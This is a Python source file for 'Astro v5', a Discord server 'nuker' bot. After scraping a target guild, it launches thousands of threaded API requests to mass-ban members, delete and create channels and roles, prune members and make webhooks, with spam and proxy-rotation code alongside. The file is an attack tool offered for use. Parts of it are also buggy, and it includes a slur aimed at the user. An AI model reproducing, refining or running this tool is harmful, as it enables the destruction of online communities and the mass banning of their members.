import os
import sys
import time
import json
import httpx
import queue
import random
import discord
import threading
from pystyle import Colorate, Colors
from discord.ext import commands

intents = discord.Intents.all()
intents.members = True
client = commands.Bot(command_prefix = "astro!",case_insensitive = False,bot = True,intents=intents)
amount = 0

class astro:
    if os.name == "nt":
       os.system("cls")
    else:
       terminal_title = "Astro v5 - Made by horrid"
       print(f'\33]0;{terminal_title}\a', end='', flush=True)
       os.system("clear")
    menu2 = f'''

                                           ▄████████    ▄████████     ███        ▄████████  ▄██████▄
                                          ███    ███   ███    ███ ▀█████████▄   ███    ███ ███    ███
                                          ███    ███   ███    █▀     ▀███▀▀██   ███    ███ ███    ███
                                          ███    ███   ███            ███   ▀  ▄███▄▄▄▄██▀ ███    ███
                                        ▀███████████ ▀███████████     ███     ▀▀███▀▀▀▀▀   ███    ███
                                          ███    ███          ███     ███     ▀███████████ ███    ███
                                          ███    ███    ▄█    ███     ███       ███    ███ ███    ███
                                          ███    █▀   ▄████████▀     ▄████▀     ███    ███  ▀██████▀
                                                                                ███    ███

                                                                  choices:
                                     ╔═════════════════════════════════════════════════════════════════╗
	                             ║ [1] - massban ids                         [2] - massban scraped ║
        	                     ║ [3] - delete channels                     [4] - create channels ║
                	             ║ [5] - delete roles                        [6] - create roles    ║
                        	     ║ [7] - prune members                       [8] - soon...         ║
                                     ╚═════════════════════════════════════════════════════════════════╝
> astro.cybin.cc
> made by horrid

                                                                    Log:

'''
    logo2 = f'''

                                           ▄████████    ▄████████     ███        ▄████████  ▄██████▄
                                          ███    ███   ███    ███ ▀█████████▄   ███    ███ ███    ███
                                          ███    ███   ███    █▀     ▀███▀▀██   ███    ███ ███    ███
                                          ███    ███   ███            ███   ▀  ▄███▄▄▄▄██▀ ███    ███
                                        ▀███████████ ▀███████████     ███     ▀▀███▀▀▀▀▀   ███    ███
                                          ███    ███          ███     ███     ▀███████████ ███    ███
                                          ███    ███    ▄█    ███     ███       ███    ███ ███    ███
                                          ███    █▀   ▄████████▀     ▄████▀     ███    ███  ▀██████▀
                                                                                ███    ███

                                                             > astro.cybin.cc
                                                             > made by horrid

                                                                    Log:
'''
    menu = f'''
                                                                - Astro v5 -
                                                     ___
                                                  ,o88888
                                               ,o8888888'
                         ,:o:o:oooo.        ,8O88Pd8888"                             :::      :::::::: ::::::::::: :::::::::   ::::::::
                     ,.::.::o:ooooOoOoO. ,oO8O8Pd888'"                            +:+   +:+  +:+           +:+     +:+    +:+ +:+    +:+
                   ,.:.::o:ooOoOoOO8O8OOo.8OOPd8O8O"                            +:+   +:+  +:+           +:+     +:+    +:+ +:+    +:+
                  , ..:.::o:ooOoOOOO8OOOOo.FdO8O8"                            +#++:++#++: +#++:++#++    +#+     +#++:++#:  +#+    +:+
                 , ..:.::o:ooOoOO8O888O8O,COCOO"                             +#+     +#+        +#+    +#+     +#+    +#+ +#+    +#+
                , . ..:.::o:ooOoOOOO8OOOOCOCO"                              ###     ###  ########     ###     ###    ###  ########
                 . ..:.::o:ooOoOoOO8O8OCCCC"o
                    . ..:.::o:ooooOoCoCCC"o:o                                                    --------------
                    . ..:.::o:o:,cooooCo"oo:o:                                               _   __      __
                 `   . . ..:.:cocoooo"'o:o:::'                                              / | / /_  __/ /_____  _____
                 .`   . ..::ccccoc"'o:o:o:::'                                              /  |/ / / / / //_/ _ \/ ___/
                :.:.    ,c:cccc"':.:.:.:.:.'                                              / /|  / /_/ / ,< /  __/ /
              ..:.:"'`::::c:"'..:.:.:.:.:.'                                              /_/ |_/\__,_/_/|_|\___/_/
            ...:.'.:.::::"'    . . . . .'
           .. . ....:."' `   .  . . ''
         . . . ...."'
         .. . ."'
        .

                                                                  choices:
                                     ╔═════════════════════════════════════════════════════════════════╗
	                             ║ [1] - massban ids                         [2] - massban scraped ║
        	                     ║ [3] - delete channels                     [4] - create channels ║
                	             ║ [5] - delete roles                        [6] - create roles    ║
                        	     ║ [7] - prune members                       [8] - soon...         ║
                                     ╚═════════════════════════════════════════════════════════════════╝

> astro.cybin.cc
> made by horrid
---------------------------------------------------------------------------------------------------------------------------------------------

                                 $ That's one small step for man, one giant leap for mankind. - Armstrong $

---------------------------------------------------------------------------------------------------------------------------------------------
                                                                    Log:

'''
    logo = f'''
                                                                - Astro v5 -
                                                     ___
                                                  ,o88888
                                               ,o8888888'
                         ,:o:o:oooo.        ,8O88Pd8888"                             :::      :::::::: ::::::::::: :::::::::   ::::::::
                     ,.::.::o:ooooOoOoO. ,oO8O8Pd888'"                            +:+   +:+  +:+           +:+     +:+    +:+ +:+    +:+
                   ,.:.::o:ooOoOoOO8O8OOo.8OOPd8O8O"                            +:+   +:+  +:+           +:+     +:+    +:+ +:+    +:+
                  , ..:.::o:ooOoOOOO8OOOOo.FdO8O8"                            +#++:++#++: +#++:++#++    +#+     +#++:++#:  +#+    +:+
                 , ..:.::o:ooOoOO8O888O8O,COCOO"                             +#+     +#+        +#+    +#+     +#+    +#+ +#+    +#+
                , . ..:.::o:ooOoOOOO8OOOOCOCO"                              ###     ###  ########     ###     ###    ###  ########
                 . ..:.::o:ooOoOoOO8O8OCCCC"o
                    . ..:.::o:ooooOoCoCCC"o:o                                                    --------------
                    . ..:.::o:o:,cooooCo"oo:o:                                               _   __      __
                 `   . . ..:.:cocoooo"'o:o:::'                                              / | / /_  __/ /_____  _____
                 .`   . ..::ccccoc"'o:o:o:::'                                              /  |/ / / / / //_/ _ \/ ___/
                :.:.    ,c:cccc"':.:.:.:.:.'                                              / /|  / /_/ / ,< /  __/ /
              ..:.:"'`::::c:"'..:.:.:.:.:.'                                              /_/ |_/\__,_/_/|_|\___/_/
            ...:.'.:.::::"'    . . . . .'
           .. . ....:."' `   .  . . ''
         . . . ...."'
         .. . ."'
        .


> astro.cybin.cc
> made by horrid
---------------------------------------------------------------------------------------------------------------------------------------------

                                 $ That's one small step for man, one giant leap for mankind. - Armstrong $

---------------------------------------------------------------------------------------------------------------------------------------------
                                                                    Log:

'''
    motd = [logo, logo2]
    banner = random.choice(motd)
    with open("settings.json") as f:
        settings = json.load(f)
    token = settings.get("Token")
    channames = settings.get("Channel Names")
    rolenames = settings.get("Role Names")
    whookusers = settings.get("Webhook Usernames")
    whookcontents = settings.get("Spam Messages")
    print(Colorate.Vertical(Colors.yellow_to_red, banner, 1))
    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - loading script...", 1))
    time.sleep(5)
    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - done, press enter to start.", 1))
    input()
    if os.name == "nt":
       os.system("title Astro-v5")
       os.system("cls")
    else:
       terminal_title = "Astro v5 | Made by horrid"
       print(f'\33]0;{terminal_title}\a', end='', flush=True)
       os.system("clear")
    print(Colorate.Vertical(Colors.yellow_to_red, banner, 1))
    guild = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter guild id: \u001b[0m", 1))
    q = queue.Queue()
    apiv = ["v9", "v6"]
    option = []
    count = 0
    headers = {"Authorization": f"Bot {token}"}
    jsonparam = {"name": random.choice(channames)}
    pruneparam = {"days": 1}
    jsonparamrole = {"name": random.choice(rolenames)}
    spamparam = {"content": random.choice(whookcontents)}
    whookparam = {"name": random.choice(whookusers)}

    def massbansend():
        try:
            while True:
                req, url, headers = astro.q.get()
                p = open("proxies.txt", "r")
                pr = p.readlines()
                proxy = {"HTTP": f"http://{random.choice(pr)}"}
                s = req(url, headers=headers)
                print(s.status_code)
                astro.count += 1
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} banned member - status code: {s.status_code} - time: {time.ctime()}", 1))
                if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
                    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
                astro.q.task_done()
        except Exception as err:
            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
            else:
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))

    def chandelreqsend():
        try:
            while True:
                req, url, headers = astro.q.get()
                p = open("proxies.txt", "r")
                pr = p.readlines()
                proxy = {"HTTP": f"http://{random.choice(pr)}"}
                s = req(url, headers=headers)
                astro.count += 1
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} channel deleted - status code: {s.status_code} - time: {time.ctime()}", 1))
                astro.q.task_done()
        except Exception as err:
            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
            else:
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))

    def chancrereqsend():
        try:
            while True:
                req, url, headers = astro.q.get()
                p = open("proxies.txt", "r")
                pr = p.readlines()
                proxy = {"HTTP": f"http://{random.choice(pr)}"}
                s = req(url, headers=headers, json=astro.jsonparam)
                astro.count += 1
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} channel created - status code: {s.status_code} - time: {time.ctime()}", 1))
                astro.q.task_done()
        except Exception as err:
            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
            else:
                print(err)
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))

    def rolecrereqsend():
        try:
            while True:
                req, url, headers = astro.q.get()
                p = open("proxies.txt", "r")
                pr = p.readlines()
                proxy = {"HTTP": f"http://{random.choice(pr)}"}
                s = req(url, headers=headers, json=astro.jsonparamrole)
                astro.count += 1
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} role created - status code: {s.status_code} - time: {time.ctime()}", 1))
                astro.q.task_done()
        except Exception as err:
            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
            else:
                print(err)
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))

    def whookmakesend():
        try:
            while True:
                req, url, headers = astro.q.get()
                p = open("proxies.txt", "r")
                pr = p.readlines()
                proxy = {"HTTP": f"http://{random.choice(pr)}"}
                s = req(url, headers=headers, json=astro.whookparam)
                astro.count += 1
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} webhook made - status code: {s.status_code} - time: {time.ctime()}", 1))
                astro.q.task_done()
        except Exception as err:
            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
            else:
                print(err)
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))


    def chandelsend():
        try:
            while True:
                req, url, headers = astro.q.get()
                p = open("proxies.txt", "r")
                pr = p.readlines()
                proxy = {"HTTP": f"http://{random.choice(pr)}"}
                s = req(url, headers=headers)
                astro.count += 1
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} deleted channels - status code: {s.status_code} - time: {time.ctime()}", 1))
                if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
                    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
                    for i in range(50):
                        input()
                astro.q.task_done()
        except Exception as err:
            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
            else:
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))

    def roledelsend():
        try:
            while True:
                req, url, headers = astro.q.get()
                p = open("proxies.txt", "r")
                pr = p.readlines()
                proxy = {"HTTP": f"http://{random.choice(pr)}"}
                s = req(url, headers=headers)
                astro.count += 1
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} deleted roles - status code: {s.status_code} - time: {time.ctime()}", 1))
                if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
                    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
                    for i in range(50):
                        input()
                astro.q.task_done()
        except Exception as err:
            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
            else:
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))

    def prunereqsend():
        try:
            while True:
                req, url, headers = astro.q.get()
                p = open("proxies.txt", "r")
                pr = p.readlines()
                proxy = {"HTTP": f"http://{random.choice(pr)}"}
                s = req(url, headers=headers, json=astro.pruneparam)
                astro.count += 1
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - pruned members - status code: {s.status_code} - time: {time.ctime()}", 1))
                astro.q.task_done()
        except Exception as err:
            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
            else:
                print(err)
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))

    def spamreqsend():
        try:
            while True:
                req, url, headers = astro.q.get()
                p = open("proxies.txt", "r")
                pr = p.readlines()
                proxy = {"HTTP": f"http://{random.choice(pr)}"}
                s = req(url, headers=headers, json=spamparam)
                astro.count += 1
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} messages sent - status code: {s.status_code} - time: {time.ctime()}", 1))
                astro.q.task_done()
        except Exception as err:
            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
            else:
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))

    def idworker():
        for member in open("scraped/ids.txt"):
            ranidapi = [f"https://discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://discordapp.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://canary.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://ptb.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}"]
            astro.q.put((httpx.put, random.choice(ranidapi), astro.headers))
        astro.q.join()

    def massbanworker():
        for member in open("scraped/scraped.txt"):
            ranapi = [f"https://discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://discordapp.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://canary.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://ptb.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}"]
            astro.q.put((httpx.put, random.choice(ranapi), astro.headers))
            amount += 1
            os.system(f"title Astrov5 - Bans: {amount}")
        astro.q.join()

    def channeldelworker():
        for channel in open("scraped/channels.txt"):
            ranchanapi = [f"https://discord.com/api/v9/channels/{channel}", f"https://discordapp.com/api/v9/channels/{channel}", f"https://canary.discord.com/api/v9/channels/{channel}", f"https://ptb.discord.com/api/v9/channels/{channel}"]
            astro.q.put((httpx.delete, random.choice(ranchanapi), astro.headers))

    def channelmakeworker():
        for i in range(1000):
            ranchancrapi = [f"https://discord.com/api/v9/guilds/{astro.guild}/channels/", f"https://discordapp.com/api/v9/guilds/{astro.guild}/channels/", f"https://canary.discord.com/api/v9/guilds/{astro.guild}/channels/", f"https://ptb.discord.com/api/v9/guilds/{astro.guild}/channels"]
            astro.q.put((httpx.post, random.choice(ranchancrapi), astro.headers))

    def roledelworker():
        for role in open("scraped/roles.txt"):
            for i in range(1000):
                ranroledelapi = [f"https://discord.com/api/v9/guilds/{astro.guild}/roles/{role}",f"https://discordapp.com/api/v9/guilds/{astro.guild}/roles/{role}", f"https://canary.discord.com/api/v9/guilds/{astro.guild}/roles/{role}", f"https://ptb.discord.com/api/v9/guilds/{astro.guild}/roles/{role}"]
                astro.q.put((httpx.delete, random.choice(ranroledelapi), astro.headers))

    def rolemakeworker():
        for i in range(1000):
            ranrolecrapi = [f"https://discord.com/api/v9/guilds/{astro.guild}/roles/", f"https://discordapp.com/api/v9/guilds/{astro.guild}/roles/", f"https://canary.discord.com/api/v9/guilds/{astro.guild}/roles/", f"https://ptb.discord.com/api/v9/guilds/{astro.guild}/roles"]
            astro.q.put((httpx.post, random.choice(ranrolecrapi), astro.headers))

    def pruneworker():
        for i in range(10):
            url = f"https://discord.com/v9/guilds/{astro.guild}/prune/"
            astro.q.put((httpx.post, url, astro.headers))

    def makewhooks():
        for channel in open("scraped/channels.txt"):
            whookapi = f"https://discord.com/api/v9/channels/{channel}/webhooks"
            astro.q.put((httpx.post, whookapi, astro.headers))

    def spamworker():
        for channel in open("scraped/channels.txt"):
            for i in range(1000):
                ranspamapi = [f"https://discord.com/api/v9/channels/{channel}/messages", f"https://discordapp.com/api/api/v9/channels/{channel}/messages", f"https://canary.discord.com/api/v9/channels/{channel}/messages", f"https://ptb.discord.com/api/v9/channels/{channel}/messages"]
                astro.q.put((httpx.post, random.choice(ranspamapi), astro.headers))

    @client.event
    async def on_connect():
        try:
            guild = await client.fetch_guild(int(astro.guild))
            id = client.get_guild(int(astro.guild))
        except:
            print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - guild id is invalid", 1))
            input()
            os._exit(0)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        if astro.banner == astro.logo:
            print(Colorate.Vertical(Colors.yellow_to_red, astro.menu, 1))
        else:
            print(Colorate.Vertical(Colors.yellow_to_red, astro.menu2, 1))
        print("astro@localhost - scraping..")
        members = await guild.chunk()
        print("astro@localhost - done.")

        with open('scraped/channels.txt', 'a') as c:
            for channel in id.channels:
                c.write(f"{channel.id}\n")

        with open("scraped/roles.txt", "a") as o:
            for role in id.roles:
                o.write(f"{role.id}\n")

        with open('scraped/scraped.txt', 'a') as z:
            for member in members:
                z.write(str(member.id) + "\n")

        option = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - choice: \u001b[0m", 1))

        if option == "1":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
            time.sleep(5)
            astro.idworker()
            for x in range(1000):
                threading.Thread(target=astro.massbansend, daemon=True).start()

        if option == "2":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
            time.sleep(5)
            astro.massbanworker()
            for x in range(1000):
                threading.Thread(target=astro.massbansend, daemon=True).start()

        if option == "3":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
            time.sleep(5)
            astro.channeldelworker()
            for x in range(1000):
                threading.Thread(target=astro.chandelreqsend, daemon=True).start()

        if option == "4":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
            time.sleep(5)
            astro.channelmakeworker()
            for x in range(1000):
                threading.Thread(target=astro.chancrereqsend, daemon=True).start()

        if option == "5":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
            time.sleep(5)
            astro.roledelworker()
            for x in range(1000):
                threading.Thread(target=astro.roledelsend, daemon=True).start()

        if option == "6":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
            time.sleep(5)
            astro.rolemakeworker()
            for x in range(1000):
                threading.Thread(target=astro.rolecrereqsend, daemon=True).start()

        if option == "7":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
            time.sleep(5)
            astro.pruneworker()
            for x in range(1):
                threading.Thread(target=astro.prunereqsend, daemon=True).start()

        if option == "8":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
            time.sleep(5)
            astro.makewhooks()
            for x in range(1000):
                threading.Thread(target=astro.whookmakesend, daemon=True).start()

        else:
            try:
                print("wow retard can't choose a number?, damn.")
                exit()
            except:
                exit()

if __name__ == "__main__":
    try:
        client.run(astro.token)
    except:
        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - token is invalid or ratelimited.", 1))
        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - please make sure you have all intents enabled on your bots token.", 1))
        input()
        exit()
